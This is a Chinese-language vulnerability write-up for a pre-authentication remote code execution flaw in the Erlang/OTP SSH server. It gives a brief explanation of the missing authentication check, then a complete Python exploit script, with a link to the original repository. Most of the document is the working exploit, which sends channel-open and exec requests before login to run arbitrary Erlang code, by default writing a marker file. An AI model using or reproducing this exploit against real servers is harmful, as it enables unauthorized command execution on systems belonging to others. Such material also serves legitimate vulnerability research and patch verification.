# Erlang-OTP SSH服务器存在rce漏洞

# 漏洞描述
Erlang/OTP SSH 服务器在 SSH 连接早期处理协议消息的方式缺陷导致的。通常情况下，SSH 服务器会等待用户完成身份验证，然后才会接受和处理某些类型的消息，尤其是那些请求访问命令执行权限的消息。然而，由于 Erlang/OTP 实现中缺少一项检查，因此有可能在完成身份验证之前发送特定的 SSH 消息，服务器会错误地将其处理为用户已通过验证。

# 漏洞利用脚本
```python
import socket
import struct
import time

HOST = "127.0.0.1"  # Target IP (change if needed)
PORT = 2222  # Target port (change if needed)


# Helper to format SSH string (4-byte length + bytes)
def string_payload(s):
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes


# Builds SSH_MSG_CHANNEL_OPEN for session
def build_channel_open(channel_id=0):
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
        + string_payload("session")
        + struct.pack(">I", channel_id)  # sender channel ID
        + struct.pack(">I", 0x68000)  # initial window size
        + struct.pack(">I", 0x10000)  # max packet size
    )


# Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
def build_channel_request(channel_id=0, command=None):
    if command is None:
        command = 'file:write_file("/lab.txt", <<"pwned">>).'
    return (
        b"\x62"  # SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", channel_id)
        + string_payload("exec")
        + b"\x01"  # want_reply = true
        + string_payload(command)
    )


# Builds a minimal but valid SSH_MSG_KEXINIT packet
def build_kexinit():
    cookie = b"\x00" * 16

    def name_list(l):
        return string_payload(",".join(l))

    # Match server-supported algorithms from the log
    return (
        b"\x14"
        + cookie
        + name_list(
            [
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group-exchange-sha256",
                "diffie-hellman-group14-sha256",
            ]
        )  # kex algorithms
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
        + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
        + name_list(["hmac-sha1"]) * 2  # MAC algorithms
        + name_list(["none"]) * 2  # compression
        + name_list([]) * 2  # languages
        + b"\x00"
        + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
    )


# Pads a packet to match SSH framing
def pad_packet(payload, block_size=8):
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size
    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )


# === Exploit flow ===
try:
    with socket.create_connection((HOST, PORT), timeout=5) as s:
        print("[*] Connecting to SSH server...")

        # 1. Banner exchange
        s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
        banner = s.recv(1024)
        print(f"[+] Received banner: {banner.strip().decode(errors='ignore')}")
        time.sleep(0.5)  # Small delay between packets

        # 2. Send SSH_MSG_KEXINIT
        print("[*] Sending SSH_MSG_KEXINIT...")
        kex_packet = build_kexinit()
        s.sendall(pad_packet(kex_packet))
        time.sleep(0.5)  # Small delay between packets

        # 3. Send SSH_MSG_CHANNEL_OPEN
        print("[*] Sending SSH_MSG_CHANNEL_OPEN...")
        chan_open = build_channel_open()
        s.sendall(pad_packet(chan_open))
        time.sleep(0.5)  # Small delay between packets

        # 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)
        print("[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...")
        chan_req = build_channel_request(
            command='file:write_file("/lab.txt", <<"pwned">>).'
        )
        s.sendall(pad_packet(chan_req))

        print(
            "[✓] Exploit sent! If the server is vulnerable, it should have written to /lab.txt."
        )

        # Try to receive any response (might get a protocol error or disconnect)
        try:
            response = s.recv(1024)
            print(f"[+] Received response: {response.hex()}")
        except socket.timeout:
            print("[*] No response within timeout period (which is expected)")

except Exception as e:
    print(f"[!] Error: {e}")
```
![image](https://github.com/user-attachments/assets/563069d6-8f47-4989-a3ef-5e8b9dd971c0)

漏洞原文：https://github.com/ProDefense/CVE-2025-32433
